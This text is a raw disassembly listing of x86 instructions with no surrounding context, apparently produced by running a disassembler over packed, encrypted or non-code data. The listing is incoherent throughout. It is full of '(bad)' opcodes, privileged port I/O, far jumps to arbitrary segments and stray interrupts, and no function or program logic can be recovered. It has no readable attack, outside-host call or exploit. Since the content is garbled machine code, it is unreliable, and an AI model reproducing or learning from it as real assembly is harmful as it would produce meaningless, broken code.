  41d521:	(bad)  
  41d522:	stos   DWORD PTR es:[edi],eax
  41d523:	mov    ecx,0x4f548b8a
  41d528:	fldcw  WORD PTR [eax-0x73]
  41d52b:	dec    edi
  41d52c:	imul   eax,DWORD PTR [ebx+0x49c182c7],0xffffffbf
  41d533:	ins    DWORD PTR es:[edi],dx
  41d534:	pop    esp
  41d535:	mov    BYTE PTR [esp+eax*2-0x4d],bh
  41d539:	inc    edx
  41d53a:	pop    ds
  41d53b:	out    dx,eax
  41d53c:	ret    
  41d53d:	push   ds
  41d53e:	xchg   esp,eax
  41d53f:	dec    edi
  41d540:	cmp    al,0xd5
  41d542:	out    dx,eax
  41d543:	jge    0x41d4e2
  41d545:	aad    0xf9
  41d547:	gs repz sbb eax,0xa45c2101
  41d54e:	xchg   esp,eax
  41d54f:	xlat   BYTE PTR ds:[ebx]
  41d550:	aaa    
  41d551:	cs xor al,al
  41d554:	(bad)  
  41d555:	pop    edi
  41d556:	shr    DWORD PTR [edi],1
  41d558:	fwait
  41d559:	mov    ds:0x9b687389,eax
  41d55e:	and    al,0xf4
  41d560:	loop   0x41d5d7
  41d562:	push   cs
  41d563:	cli    
  41d564:	push   esi
  41d565:	xor    BYTE PTR [ebp+0x66a1ad4],dh
  41d56b:	mov    eax,0x3a68b038
  41d570:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d571:	loop   0x41d55e
  41d573:	sahf   
  41d574:	xchg   ebx,eax
  41d575:	addr16 cwde 
  41d577:	cmp    eax,0x83958e3d
  41d57c:	xchg   DWORD PTR [esi+0x2eca586f],ecx
  41d582:	cmp    ebx,DWORD PTR [ecx+ebp*1]
  41d585:	sbb    eax,0x3a7cbf96
  41d58a:	mov    ah,0x6e
  41d58c:	ret    
  41d58d:	nop
  41d58e:	inc    esp
  41d58f:	and    ecx,DWORD PTR [edx+0x3b8fc9e0]
  41d595:	lods   al,BYTE PTR ds:[esi]
  41d596:	fst    QWORD PTR [bx+si]
  41d599:	dec    ebp
  41d59a:	fldcw  WORD PTR [esi-0x5f96a9d5]
  41d5a0:	retf   0x8e27
  41d5a3:	aaa    
  41d5a4:	push   eax
  41d5a5:	jmp    0x3441:0xab6d6987
  41d5ac:	stos   DWORD PTR es:[edi],eax
  41d5ad:	or     BYTE PTR [ebx+0x38],dh
  41d5b0:	dec    edx
  41d5b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d5b2:	sahf   
  41d5b3:	jnp    0x41d5c6
  41d5b5:	jae    0x41d55f
  41d5b7:	push   esi
  41d5b8:	in     al,dx
  41d5b9:	daa    
  41d5ba:	mov    bh,0xe1
  41d5bc:	cmp    DWORD PTR [edx+0x30],0x81c399c9
  41d5c3:	rol    DWORD PTR [eax+0x7e2c1f12],0xbe
  41d5ca:	int    0x6
  41d5cc:	xor    dh,BYTE PTR [esp+ecx*4]
  41d5cf:	int    0x39
  41d5d1:	fist   WORD PTR [edi+0x69b5ce27]
  41d5d7:	push   edx
  41d5d8:	adc    al,0x43
  41d5da:	(bad)  
  41d5db:	pushf  
  41d5dc:	retf   0x3da
  41d5df:	push   es
  41d5e0:	sub    esp,DWORD PTR [ebx+0x45]
  41d5e3:	inc    eax
  41d5e4:	jo     0x41d635
  41d5e6:	dec    ebp
  41d5e7:	adc    ebx,esi
  41d5e9:	mov    edi,0xe8b4af74
  41d5ee:	cmp    ah,BYTE PTR [esi]
  41d5f0:	xlat   BYTE PTR ds:[ebx]
  41d5f1:	(bad)  
  41d5f2:	adc    al,dl
  41d5f4:	outs   dx,DWORD PTR ds:[esi]
  41d5f5:	dec    ecx
  41d5f6:	shl    BYTE PTR ds:[ebp-0x757dc36c],0x42
  41d5fe:	scas   eax,DWORD PTR es:[edi]
  41d5ff:	fsub   st,st(2)
  41d601:	mov    dh,0x38
  41d603:	scas   eax,DWORD PTR es:[edi]
  41d604:	pop    ebp
  41d605:	scas   al,BYTE PTR es:[edi]
  41d606:	test   DWORD PTR [ebx-0x457fb44d],ebp
  41d60c:	push   esp
  41d60d:	jnp    0x41d613
  41d60f:	push   esi
  41d610:	or     bl,BYTE PTR [ebx+0x5d455d88]
  41d616:	mov    edx,0x38dcac7c
  41d61b:	rol    BYTE PTR [ebx-0x6c],cl
  41d61e:	jle    0x41d5df
  41d620:	push   esp
  41d621:	test   DWORD PTR [ebx],0xf609526
  41d627:	frstor [ecx+eiz*2+0x44]
  41d62b:	add    eax,0xf9854633
  41d630:	mov    ch,0x7b
  41d632:	or     BYTE PTR ds:0xe3fbf3c0,dl
  41d638:	pop    edi
  41d639:	mov    ch,0x8c
  41d63b:	lahf   
  41d63c:	sti    
  41d63d:	(bad)  
  41d63e:	fdivr  DWORD PTR [esi-0x3f1cd2da]
  41d644:	ret    0xabe0
  41d647:	push   ebx
  41d648:	int3   
  41d649:	stos   BYTE PTR es:[edi],al
  41d64a:	xchg   esp,eax
  41d64b:	and    eax,ebx
  41d64d:	dec    ebx
  41d64e:	scas   eax,DWORD PTR es:[edi]
  41d64f:	push   eax
  41d650:	xor    ah,BYTE PTR [edi-0x690c5f0a]
  41d656:	aad    0x2a
  41d658:	pop    es
  41d659:	cli    
  41d65a:	jno    0x41d658
  41d65c:	imul   ebp,DWORD PTR [eax],0x49
  41d65f:	cmp    eax,0xa2e16ed
  41d664:	sbb    ch,BYTE PTR [edi]
  41d666:	xor    bl,dh
  41d668:	xchg   ecx,eax
  41d669:	lea    ecx,[edi+0xc]
  41d66c:	sub    DWORD PTR [eax],0x4ce44c01
  41d672:	xchg   esi,eax
  41d673:	lds    ebx,FWORD PTR [ebp+edx*8-0x1846e47e]
  41d67a:	fisub  DWORD PTR ds:0xfe5f631d
  41d680:	xchg   ebp,eax
  41d681:	jmp    0x6c18269
  41d686:	(bad)  
  41d687:	shl    BYTE PTR [eax-0x2f],cl
  41d68a:	sti    
  41d68b:	push   DWORD PTR [eax+0x8]
  41d68e:	xchg   DWORD PTR [eax],edx
  41d690:	pop    esp
  41d691:	jmp    0x2255:0xd30368bd
  41d698:	mov    ds:0x33dd361a,al
  41d69d:	or     eax,esp
  41d69f:	mov    ch,BYTE PTR [ecx-0x33]
  41d6a2:	push   ss
  41d6a3:	inc    ecx
  41d6a4:	push   edi
  41d6a5:	loop   0x41d683
  41d6a7:	pop    eax
  41d6a8:	cmp    DWORD PTR [esi-0x127742f8],edi
  41d6ae:	add    ch,0x55
  41d6b1:	sub    edx,DWORD PTR [esi+0x3c]
  41d6b4:	loop   0x41d707
  41d6b6:	lock xchg ebx,eax
  41d6b8:	and    eax,0x547efea3
  41d6bd:	sti    
  41d6be:	les    esi,FWORD PTR [edx-0x114dea92]
  41d6c4:	pop    ecx
  41d6c5:	adc    BYTE PTR [ebp-0x59636ad3],0xf7
  41d6cc:	jle    0x41d723
  41d6ce:	jecxz  0x41d678
  41d6d0:	aaa    
  41d6d1:	fnsave [ecx]
  41d6d3:	dec    esi
  41d6d4:	shl    BYTE PTR [ecx+0x62],0x53
  41d6d8:	in     eax,0x81
  41d6da:	vpsllq ymm6,ymm0,xmm0
  41d6de:	fdiv   st(6),st
  41d6e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d6e1:	add    ah,BYTE PTR [edx-0x6f]
  41d6e4:	mov    edi,0x18796
  41d6e9:	out    0x5f,al
  41d6eb:	xor    al,0x9f
  41d6ed:	test   eax,0x32ec64dd
  41d6f2:	fwait
  41d6f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d6f4:	ror    DWORD PTR [esi+esi*2],cl
  41d6f7:	sbb    DWORD PTR [eax+edi*2],0xf8dd2a9b
  41d6fe:	pushf  
  41d6ff:	pusha  
  41d700:	xchg   edi,eax
  41d701:	xor    eax,0xd59c52db
  41d706:	adc    eax,0xdf1c04f4
  41d70b:	sub    ah,dh
  41d70d:	scas   eax,DWORD PTR es:[edi]
  41d70e:	ficom  DWORD PTR [esp+eax*2-0x74]
  41d712:	mov    ds:0xcc259c9a,al
  41d717:	rcl    DWORD PTR [esi-0x20e7594a],0xd7
  41d71e:	in     eax,0xdd
  41d720:	dec    ecx
  41d721:	lds    ebp,FWORD PTR [ebx+0x363a7713]
  41d727:	add    cl,0x99
  41d72a:	daa    
  41d72b:	ret    
  41d72c:	loop   0x41d783
  41d72e:	inc    ebx
  41d72f:	sub    DWORD PTR [edx+0x6a],eax
  41d732:	repnz mov cl,0x37
  41d735:	retf   
  41d736:	sub    eax,0x7274b878
  41d73b:	mov    dl,0xfe
  41d73d:	fiadd  DWORD PTR [ecx-0x6f3c3146]
  41d743:	clc    
  41d744:	add    edx,DWORD PTR [esi-0x58]
  41d747:	test   DWORD PTR [edi],edx
  41d749:	nop
  41d74a:	cmp    eax,0x97ab5195
  41d74f:	fisub  DWORD PTR [esi]
  41d751:	js     0x41d722
  41d753:	dec    ebx
  41d754:	(bad)  
  41d755:	sbb    al,0x92
  41d757:	mov    bh,0xa8
  41d759:	mov    esp,0xa62520cd
  41d75e:	cmp    BYTE PTR [edx+0x1e024b2a],0xc7
  41d765:	aaa    
  41d766:	rol    BYTE PTR [esi+0x68904a22],cl
  41d76c:	jno    0x41d72f
  41d76e:	lahf   
  41d76f:	push   ebp
  41d770:	ud2    
  41d772:	fs dec ecx
  41d774:	loop   0x41d7bf
  41d776:	add    esp,esi
  41d778:	scas   al,BYTE PTR es:[edi]
  41d779:	mov    BYTE PTR [ebp+0x0],bh
  41d77c:	jl     0x41d787
  41d77e:	dec    ebp
  41d77f:	clc    
  41d780:	inc    esi
  41d781:	inc    esp
  41d782:	loopne 0x41d74a
  41d784:	xor    edx,edi
  41d786:	sub    eax,0x602abe5b
  41d78b:	push   es
  41d78c:	(bad)  
  41d78d:	jecxz  0x41d7a2
  41d78f:	mov    eax,ds
  41d791:	or     BYTE PTR [edi+0x57376b8a],dh
  41d797:	and    eax,0xdbd6accb
  41d79c:	enter  0x8a79,0x7a
  41d7a0:	popa   
  41d7a1:	jb     0x41d79d
  41d7a3:	xchg   ecx,eax
  41d7a4:	les    edx,FWORD PTR [ebx-0x3934490d]
  41d7aa:	in     al,dx
  41d7ab:	bound  esp,QWORD PTR [ebx]
  41d7ad:	js     0x41d7f2
  41d7af:	push   esi
  41d7b0:	(bad)  
  41d7b1:	outs   dx,DWORD PTR ds:[esi]
  41d7b2:	sar    BYTE PTR [edi-0x2a],1
  41d7b5:	xor    BYTE PTR [eax+ebx*4+0x67],ch
  41d7b9:	shr    DWORD PTR [ebx],0x28
  41d7bc:	pop    esi
  41d7bd:	jmp    0x9adf:0x1dd7056f
  41d7c4:	mov    al,0xd9
  41d7c6:	ins    DWORD PTR es:[edi],dx
  41d7c7:	loop   0x41d7d9
  41d7c9:	sub    DWORD PTR [ebp+0x15],0xad5ddb2d
  41d7d0:	sub    dh,BYTE PTR ds:[edi]
  41d7d3:	es scas al,BYTE PTR es:[edi]
  41d7d5:	adc    ebp,edi
  41d7d7:	adc    eax,0xf1d6536e
  41d7dc:	push   ds
  41d7dd:	add    edx,DWORD PTR [ebp+0x49]
  41d7e0:	push   0x38
  41d7e2:	inc    edx
  41d7e3:	adc    BYTE PTR [edx],ah
  41d7e5:	mov    eax,0x842a5e02
  41d7ea:	xchg   ebx,eax
  41d7eb:	or     al,0x95
  41d7ed:	pop    edi
  41d7ee:	loop   0x41d85d
  41d7f0:	mov    edi,0xa4165c06
  41d7f5:	mov    ch,0x3e
  41d7f7:	push   ebp
  41d7f8:	jl     0x41d7d6
  41d7fa:	xchg   BYTE PTR [edx],ch
  41d7fc:	repz icebp 
  41d7fe:	fs loope 0x41d864
  41d801:	push   cs
  41d802:	ins    DWORD PTR es:[edi],dx
  41d803:	adc    eax,0xf8af3207
  41d808:	cmp    DWORD PTR [esi+0x7cd38c33],ebx
  41d80e:	or     edi,DWORD PTR [edi+ebp*1-0x60eecda5]
  41d815:	mov    al,0x91
  41d817:	ss inc ecx
  41d819:	loope  0x41d845
  41d81b:	xchg   edi,eax
  41d81c:	lea    eax,[ebx+esi*4-0x40]
  41d820:	push   ebp
  41d821:	fsub   st,st(1)
  41d823:	xlat   BYTE PTR ds:[ebx]
  41d824:	xor    bl,al
  41d826:	push   0x63
  41d828:	cld    
  41d829:	jmp    0x41d876
  41d82b:	test   al,0x39
  41d82d:	aad    0xa0
  41d82f:	les    ebp,FWORD PTR [edi-0x3298431d]
  41d835:	fild   WORD PTR [eax+0x599ecfd3]
  41d83b:	iret   
  41d83c:	lahf   
  41d83d:	scas   al,BYTE PTR es:[edi]
  41d83e:	stc    
  41d83f:	scas   eax,DWORD PTR es:[edi]
  41d840:	jne    0x41d88a
  41d842:	jno    0x41d812
  41d844:	inc    esp
  41d845:	dec    edi
  41d846:	mov    edi,0x8505236d
  41d84b:	push   edx
  41d84c:	or     DWORD PTR [ebx-0x76b3a28c],edi
  41d852:	mov    edx,0x68f3c276
  41d857:	ja     0x41d860
  41d859:	mov    cl,0xb6
  41d85b:	inc    ebp
  41d85c:	rol    BYTE PTR [edx+edx*8+0x4946968a],1
  41d863:	cs xchg edx,eax
  41d865:	inc    edx
  41d866:	adc    BYTE PTR ss:[edx],al
  41d869:	daa    
  41d86a:	push   cs
  41d86b:	fild   DWORD PTR [ebx+0x8f1b50]
  41d871:	push   esi
  41d872:	xchg   BYTE PTR [ecx-0x68],ch
  41d875:	mov    esp,0xb3361ac4
  41d87a:	and    esp,DWORD PTR [esi]
  41d87c:	push   ss
  41d87d:	adc    eax,0x6e703d44
  41d882:	aad    0x94
  41d884:	mov    bl,BYTE PTR [edi-0xfad2a15]
  41d88a:	jg     0x41d8f6
  41d88c:	sti    
  41d88d:	rol    BYTE PTR [esp+edi*2],cl
  41d890:	sbb    bh,BYTE PTR [ebx+edx*4]
  41d893:	lock mov eax,0xcc4f0bcc
  41d899:	popf   
  41d89a:	outs   dx,DWORD PTR ds:[esi]
  41d89b:	push   ecx
  41d89c:	cmp    cl,dl
  41d89e:	mov    cl,0xe8
  41d8a0:	pop    edi
  41d8a1:	xchg   BYTE PTR [ebp+0x44],cl
  41d8a4:	jbe    0x41d916
  41d8a6:	hlt    
  41d8a7:	cld    
  41d8a8:	std    
  41d8a9:	sub    al,BYTE PTR ds:0x9a173137
  41d8af:	retf   
  41d8b0:	call   0x3adf1e32
  41d8b5:	or     ebp,edi
  41d8b7:	cmp    BYTE PTR [edx-0x47],dh
  41d8ba:	sbb    BYTE PTR [edi-0x14551a68],ah
  41d8c0:	adc    ch,dh
  41d8c2:	dec    esp
  41d8c3:	js     0x41d8a9
  41d8c5:	jnp    0x41d8ba
  41d8c7:	sbb    BYTE PTR [ebp+0x741b2905],dl
  41d8cd:	leave  
  41d8ce:	in     al,0xd0
  41d8d0:	std    
  41d8d1:	cs push edi
  41d8d3:	scas   al,BYTE PTR es:[edi]
  41d8d4:	xchg   ecx,eax
  41d8d5:	or     esi,esi
  41d8d7:	and    ecx,DWORD PTR [edx-0x46]
  41d8da:	sub    al,0x9d
  41d8dc:	push   ebp
  41d8dd:	jmp    0x41d89b
  41d8df:	daa    
  41d8e0:	pop    esp
  41d8e1:	and    eax,0xcaf7005c
  41d8e6:	imul   dh
  41d8e8:	int3   
  41d8e9:	bound  edx,QWORD PTR [ebp-0x4a]
  41d8ec:	ret    
  41d8ed:	fs neg al
  41d8f0:	cmp    BYTE PTR [esi+0x752ef255],bl
  41d8f6:	pop    esp
  41d8f7:	jne    0x41d887
  41d8f9:	push   edi
  41d8fa:	mov    edx,0x213ee237
  41d8ff:	icebp  
  41d900:	popa   
  41d901:	call   0x8b17a7e3
  41d906:	mov    edx,0x2fa5a971
  41d90b:	jo     0x41d948
  41d90d:	addr16 mov dl,0x6a
  41d910:	ficom  DWORD PTR [edx+0x68d94a94]
  41d916:	retf   
  41d917:	mov    cl,0x67
  41d919:	fsubr  QWORD PTR [esi]
  41d91b:	dec    edi
  41d91c:	in     eax,0xfe
  41d91e:	ja     0x41d959
  41d920:	pushf  
  41d921:	arpl   WORD PTR [eax+0x11],cx
  41d924:	int    0x90
  41d926:	xchg   ecx,eax
  41d927:	pusha  
  41d928:	les    esi,FWORD PTR [ecx-0x6a]
  41d92b:	outs   dx,DWORD PTR ds:[esi]
  41d92c:	xlat   BYTE PTR ds:[ebx]
  41d92d:	mov    eax,0x45822deb
  41d932:	ja     0x41d8c2
  41d934:	and    eax,0x3f3d5da7
  41d939:	and    al,0x95
  41d93b:	sbb    BYTE PTR [edi],bl
  41d93d:	xor    al,BYTE PTR [ebx]
  41d93f:	enter  0xe0fa,0xc3
  41d943:	adc    eax,0x2441325f
  41d948:	dec    esp
  41d949:	inc    DWORD PTR [edx]
  41d94b:	dec    esp
  41d94c:	sbb    DWORD PTR [eax+0x202a90bb],edx
  41d952:	stos   BYTE PTR es:[edi],al
  41d953:	or     al,0xcb
  41d955:	repz out 0x44,al
  41d958:	xor    DWORD PTR [ecx-0x6b919252],esi
  41d95e:	dec    eax
  41d95f:	xor    DWORD PTR [ecx-0x60],ebx
  41d962:	retf   
  41d963:	pushf  
  41d964:	xchg   ah,al
  41d966:	sahf   
  41d967:	daa    
  41d968:	pop    eax
  41d969:	sbb    ecx,edx
  41d96b:	shl    ebp,cl
  41d96d:	cmp    al,0xd4
  41d96f:	push   ebp
  41d970:	push   edi
  41d971:	imul   esi,ebx,0xfffffff8
  41d974:	(bad)  
  41d975:	inc    esi
  41d976:	sub    DWORD PTR [esp+ebp*4+0x76b70946],0xa
  41d97e:	neg    bh
  41d980:	inc    ebx
  41d981:	pop    es
  41d982:	inc    ebx
  41d983:	out    0xe7,eax
  41d985:	scas   eax,DWORD PTR es:[edi]
  41d986:	dec    ebx
  41d987:	js     0x41d93c
  41d989:	push   eax
  41d98a:	and    eax,0xf86b43fd
  41d98f:	call   0xe16a6b98
  41d994:	dec    eax
  41d995:	lods   al,BYTE PTR ds:[esi]
  41d996:	aas    
  41d997:	xchg   ebp,eax
  41d998:	dec    eax
  41d999:	retf   0xc1c5
  41d99c:	les    esp,FWORD PTR [edi-0x17f2c2a8]
  41d9a2:	imul   BYTE PTR [ebx+eiz*2+0x8]
  41d9a6:	adc    BYTE PTR [ecx],bh
  41d9a8:	fadd   DWORD PTR [edx+0x649ef48]
  41d9ae:	lods   eax,DWORD PTR ds:[esi]
  41d9af:	test   DWORD PTR [edx-0x1efc3a21],ebx
  41d9b5:	dec    edi
  41d9b6:	jnp    0x41da03
  41d9b8:	sub    BYTE PTR [edi],dh
  41d9ba:	mov    cs,ecx
  41d9bc:	xchg   esp,eax
  41d9bd:	dec    ebx
  41d9be:	sbb    DWORD PTR [eax],edi
  41d9c0:	das    
  41d9c1:	and    BYTE PTR [esi-0x2931ba26],bh
  41d9c7:	fcmovbe st,st(3)
  41d9c9:	enter  0x3105,0x5f
  41d9cd:	push   ss
  41d9ce:	cmp    al,0xc2
  41d9d0:	xlat   BYTE PTR ds:[ebx]
  41d9d1:	icebp  
  41d9d2:	std    
  41d9d3:	mov    eax,ebp
  41d9d5:	bound  esi,QWORD PTR [edx]
  41d9d7:	mov    BYTE PTR [eax+0x23],bl
  41d9da:	outs   dx,BYTE PTR ds:[esi]
  41d9db:	loop   0x41d99c
  41d9dd:	cmp    BYTE PTR [ebp+0x75df1a0],al
  41d9e3:	cmc    
  41d9e4:	push   edi
  41d9e5:	add    eax,0x533dc5d8
  41d9ea:	sub    ah,BYTE PTR [ebp+0x65149b2e]
  41d9f0:	rol    DWORD PTR [edi+ebx*4],cl
  41d9f3:	outs   dx,DWORD PTR ds:[esi]
  41d9f4:	in     al,dx
  41d9f5:	and    BYTE PTR [ebp+0x71582f37],cl
  41d9fb:	jmp    0x42514255
  41da00:	in     eax,0x6f
  41da02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41da03:	mov    ecx,DWORD PTR [eax+0xb535593]
  41da09:	and    al,0x73
  41da0b:	popf   
  41da0c:	mov    esp,0xdddaa797
  41da11:	mul    BYTE PTR [edx+0x17]
  41da14:	stos   DWORD PTR es:[edi],eax
  41da15:	repz push edx
  41da17:	loop   0x41da98
  41da19:	ret    
  41da1a:	pushf  
  41da1b:	dec    ebp
  41da1c:	imul   ecx,DWORD PTR [ebp+0x559357d0],0x97ade462
  41da26:	and    eax,0xcc4b6d57
  41da2b:	sub    eax,ebp
  41da2d:	xchg   ecx,eax
  41da2e:	and    al,ch
  41da30:	ins    BYTE PTR es:[edi],dx
  41da31:	and    esi,DWORD PTR [ebx-0x1a]
  41da34:	repz call 0xa9ddecd7
  41da3a:	jbe    0x41da73
  41da3c:	aaa    
  41da3d:	mov    ebx,0x9ca15247
  41da42:	sub    edi,DWORD PTR [edx-0x53]
  41da45:	ret    
  41da46:	das    
  41da47:	sbb    eax,0xb618cca7
  41da4c:	jns    0x41da90
  41da4e:	mov    cl,0x5b
  41da50:	fwait
  41da51:	xchg   BYTE PTR [edx-0x68],dh
  41da54:	mov    ebx,0x6bbb2b89
  41da59:	and    eax,0xfa2dafd5
  41da5e:	in     al,dx
  41da5f:	sub    edx,DWORD PTR ds:0x79a88ce7
  41da65:	push   0xea735500
  41da6a:	ds push cs
  41da6c:	cld    
  41da6d:	add    al,0x9a
  41da6f:	inc    ecx
  41da70:	(bad)  
  41da71:	cmp    al,0x1
  41da73:	outs   dx,DWORD PTR ds:[esi]
  41da74:	fs fs jecxz 0x41dacd
  41da78:	aad    0xdc
  41da7a:	lahf   
  41da7b:	add    al,0x43
  41da7d:	ja     0x41da1d
  41da7f:	das    
  41da80:	pushf  
  41da81:	mov    ebp,esi
  41da83:	(bad)  [edi+0x7b]
  41da86:	push   ds
  41da87:	sub    DWORD PTR [ebp+eiz*4-0x59e6ec26],edi
  41da8e:	lods   al,BYTE PTR ds:[esi]
  41da8f:	(bad)  
  41da90:	ficomp DWORD PTR [ebp-0x1140a6c5]
  41da96:	sbb    eax,0x1eec56be
  41da9b:	sub    BYTE PTR fs:[eax+ebx*4],0x96
  41daa0:	into   
  41daa1:	mov    ebp,0x58df9347
  41daa6:	dec    esi
  41daa7:	jl     0x41dac5
  41daa9:	test   eax,0x6f00f680
  41daae:	mov    ch,0xa2
  41dab0:	xor    dl,ah
  41dab2:	stos   BYTE PTR es:[edi],al
  41dab3:	inc    eax
  41dab4:	and    cl,al
  41dab6:	jmp    0xe3d:0xf014
  41dabc:	inc    eax
  41dabd:	pop    esp
  41dabe:	push   esi
  41dabf:	mov    dl,0x9
  41dac1:	cmp    BYTE PTR [edx+ecx*4],bh
  41dac4:	and    al,0xab
  41dac6:	(bad)  
  41dac7:	cmp    al,0x77
  41dac9:	cmp    al,0x29
  41dacb:	jno    0x41da7e
  41dacd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dace:	dec    esp
  41dacf:	nop
  41dad0:	retf   0xe15f
  41dad3:	jns    0x41db42
  41dad5:	pop    ebx
  41dad6:	inc    edi
  41dad7:	sub    eax,ebx
  41dad9:	sub    DWORD PTR [eax+eax*8+0x2c],0x6877a561
  41dae1:	daa    
  41dae2:	adc    ch,dh
  41dae4:	pop    esi
  41dae5:	xchg   DWORD PTR [eax-0x1b],ebp
  41dae8:	mov    bh,0x12
  41daea:	mov    ebp,0x13c2e2d2
  41daef:	sub    eax,0xff37e982
  41daf4:	fidiv  WORD PTR [ebp+0x66]
  41daf7:	dec    ecx
  41daf8:	adc    al,0xe8
  41dafa:	loope  0x41daef
  41dafc:	ror    DWORD PTR [esi-0x4fd0244b],0x50
  41db03:	aam    0xed
  41db05:	les    ebx,FWORD PTR [edi-0x3]
  41db08:	push   ebx
  41db09:	pop    esp
  41db0a:	lods   al,BYTE PTR ds:[esi]
  41db0b:	imul   ecx,DWORD PTR ds:0x95a45624,0x3f
  41db12:	outs   dx,DWORD PTR ds:[esi]
  41db13:	ret    0xf072
  41db16:	adc    DWORD PTR [ebp+eiz*4-0x40],0x4b
  41db1b:	xchg   DWORD PTR [eax+0x6bc2f8f],esp
  41db21:	pop    ds
  41db22:	jne    0x41daaf
  41db24:	ins    BYTE PTR es:[edi],dx
  41db25:	imul   ebx,DWORD PTR [eax],0x38
  41db28:	fs jmp 0x41db2e
  41db2b:	pushf  
  41db2c:	jo     0x41db8f
  41db2e:	adc    DWORD PTR [ebp+ebp*2+0x1c7c0b49],edi
  41db35:	rcr    DWORD PTR [esi+0x78],1
  41db38:	inc    DWORD PTR [edx+eiz*1-0x15]
  41db3c:	dec    ebp
  41db3d:	out    0xd1,al
  41db3f:	int3   
  41db40:	or     BYTE PTR [ebp+0x17],dl
  41db43:	arpl   WORD PTR [ebx+0x4c],bp
  41db46:	or     cl,bl
  41db48:	mov    esi,0xbef94e47
  41db4d:	mov    ds,WORD PTR [esi-0x55]
  41db50:	and    al,0x68
  41db52:	in     eax,0x5
  41db54:	cmc    
  41db55:	fwait
  41db56:	cwde   
  41db57:	push   eax
  41db58:	sahf   
  41db59:	ja     0x41db16
  41db5b:	cmp    esi,DWORD PTR [ebp+0xe]
  41db5e:	sub    ebp,DWORD PTR [edi-0x56]
  41db61:	jecxz  0x41db50
  41db63:	or     dl,BYTE PTR [edi-0x44]
  41db66:	xchg   ecx,eax
  41db67:	ret    0xca25
  41db6a:	add    bh,al
  41db6c:	aaa    
  41db6d:	jae    0x41daf0
  41db6f:	mov    edx,0xb33970b7
  41db74:	mov    fs,WORD PTR [ecx+0x27fe5a4c]
  41db7a:	scas   al,BYTE PTR es:[edi]
  41db7b:	jb     0x41db06
  41db7d:	mov    esi,0x84a760d0
  41db82:	cwde   
  41db83:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41db84:	fiadd  WORD PTR [esi+0x17]
  41db87:	dec    DWORD PTR [ebx]
  41db89:	(bad)  
  41db8a:	cli    
  41db8b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41db8c:	mov    ecx,0xaa3d795
  41db91:	cmc    
  41db92:	ja     0x41dbe6
  41db94:	inc    ecx
  41db95:	std    
  41db96:	mov    BYTE PTR [ebp-0x55b0d73],bl
  41db9c:	pop    ecx
  41db9d:	(bad)  
  41db9e:	adc    BYTE PTR [eax+0xe06bda5],bh
  41dba4:	jecxz  0x41db69
  41dba6:	stos   BYTE PTR es:[edi],al
  41dba7:	pop    ecx
  41dba8:	inc    edx
  41dba9:	out    0x68,eax
  41dbab:	xchg   ebp,eax
  41dbac:	in     eax,0xc1
  41dbae:	pop    edi
  41dbaf:	and    ch,BYTE PTR [eax]
  41dbb1:	mul    BYTE PTR [eax+esi*2+0x4254e1da]
  41dbb8:	push   ebx
  41dbb9:	call   0xaea53b53
  41dbbe:	and    DWORD PTR [esi],eax
  41dbc0:	xor    eax,ebp
  41dbc2:	mov    bh,0x2b
  41dbc4:	fild   QWORD PTR [ebp-0x119beb43]
  41dbca:	sub    BYTE PTR [eax+0x32f12239],al
  41dbd0:	adc    dl,0x0
  41dbd3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dbd4:	mov    bh,BYTE PTR [eax-0x38]
  41dbd7:	dec    edx
  41dbd8:	scas   eax,DWORD PTR es:[edi]
  41dbd9:	addr16 out 0x43,eax
  41dbdc:	jno    0x41db6c
  41dbde:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dbdf:	pop    ebp
  41dbe0:	cmp    al,bl
  41dbe2:	or     eax,ebx
  41dbe4:	outs   dx,BYTE PTR cs:[esi]
  41dbe6:	out    0x92,eax
  41dbe8:	push   edi
  41dbe9:	shl    DWORD PTR [ebx],0xa4
  41dbec:	popf   
  41dbed:	es push ds
  41dbef:	add    DWORD PTR [eax],ebx
  41dbf1:	dec    edx
  41dbf2:	out    dx,eax
  41dbf3:	fcmovbe st,st(6)
  41dbf5:	clc    
  41dbf6:	jae    0x41dbc5
  41dbf8:	div    ch
  41dbfa:	pop    edx
  41dbfb:	cmp    cl,BYTE PTR [ebx+0x38]
  41dbfe:	imul   ebx,DWORD PTR [edi+0x618a45dd],0xa4343fd
  41dc08:	int    0xc0
  41dc0a:	(bad)  
  41dc0b:	repz adc edx,ebp
  41dc0e:	ss fdivr st(3),st
  41dc11:	mov    eax,ds:0x78681deb
  41dc16:	mov    edx,0x35958a20
  41dc1b:	cmp    eax,0x2cba3a76
  41dc20:	aam    0xd6
  41dc22:	add    BYTE PTR [esi],bl
  41dc24:	cmp    al,0x5e
  41dc26:	xchg   ebx,eax
  41dc27:	(bad)  
  41dc28:	into   
  41dc29:	fild   DWORD PTR [ebx+0x29c04238]
  41dc2f:	imul   edx,DWORD PTR [ebx+0xbe50ec0],0x90517fb4
  41dc39:	dec    eax
  41dc3a:	repz adc eax,0xa22f898
  41dc40:	int    0x27
  41dc42:	sti    
  41dc43:	xchg   esp,eax
  41dc44:	mov    DWORD PTR [eax],edx
  41dc46:	js     0x41dbfa
  41dc48:	mov    bh,0xb3
  41dc4a:	pop    edi
  41dc4b:	xor    dl,0xa4
  41dc4e:	cld    
  41dc4f:	mov    esp,0x4b21ad51
  41dc54:	mov    ?,WORD PTR [ebx+0x34efbf0]
  41dc5a:	neg    esp
  41dc5c:	jae    0x41dca1
  41dc5e:	ficom  WORD PTR [ebx]
  41dc60:	mov    WORD PTR [edx+0x25f0b3f9],es
  41dc66:	popa   
  41dc67:	loop   0x41dc5b
  41dc69:	jne    0x41dc9c
  41dc6b:	lods   eax,DWORD PTR ds:[esi]
  41dc6c:	sbb    BYTE PTR [esi],al
  41dc6e:	out    dx,al
  41dc6f:	fidiv  WORD PTR [edx+0xb4a9d4c]
  41dc75:	fistp  QWORD PTR [ebx-0x7ea6731d]
  41dc7b:	mov    ebx,0x2352442c
  41dc80:	fild   QWORD PTR [eax+0x52]
  41dc83:	sbb    DWORD PTR [esi],ebp
  41dc85:	and    edx,DWORD PTR [ecx]
